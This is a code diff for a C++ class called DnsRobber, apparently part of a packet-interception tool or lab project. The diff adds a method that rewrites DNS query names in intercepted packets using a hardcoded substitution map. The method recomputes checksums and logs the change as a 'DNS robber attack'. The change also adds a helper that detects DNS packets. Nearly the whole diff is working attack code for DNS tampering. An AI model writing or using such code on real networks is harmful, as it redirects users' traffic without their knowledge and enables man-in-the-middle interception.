@@ -25,6 +25,27 @@ public:
 
     DnsRobber(){};
     ~DnsRobber(){};
+
+    void singleCraftInGoing(Packet *inPacket) {
+        bool hit = false;
+        DnsQuery *q;
+        DnsLayer *response = inPacket->getLayerOfType<DnsLayer>();
+        if (response == NULL || (q = response->getFirstQuery()) == NULL)
+            return;
+        //DOC: eseguo la sostituzione
+        do {
+            map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
+            for (auto &dnsname : substitutions) {
+                if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second)) {
+                    DEBUG("\t>> DNS robber attack is going: " << dnsname.first << " --> " << dnsname.second << endl);
+                }
+            }
+            this->shots++;
+        } while ((q = response->getNextQuery(q)) != NULL);
+        inPacket->computeCalculateFields();
+        return;
+    };
+
     vector<RawPacket *> *craftInGoing(RawPacket *inPacket) {
         Packet parsedPacket(inPacket);
         vector<RawPacket *> *pp = new vector<RawPacket *>();
@@ -46,6 +67,7 @@ public:
         pp->push_back(inPacket);
         return pp;
     }
+
     vector<RawPacket *> *craftOutGoing(RawPacket *inPacket) {
         Packet parsedPacket(inPacket);
         vector<RawPacket *> *pp = new vector<RawPacket *>();
@@ -55,7 +77,7 @@ public:
         if (response == NULL || (q = response->getFirstQuery()) == NULL)
             return nullptr;
         do {
-            DEBUG(q->getName());
+            DEBUG("url to resolve: " << q->getName() << endl);
             //*(map<string, string> *)(c.data)
             map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
             for (auto &dnsname : substitutions) {
@@ -66,5 +88,9 @@ public:
         } while ((q = response->getNextQuery(q)) != NULL);
         pp->push_back(inPacket);
         return pp;
+    }
+
+    static bool isDns(Packet *p) {
+        return p->getLayerOfType<DnsLayer>() != nullptr;
     }
 };
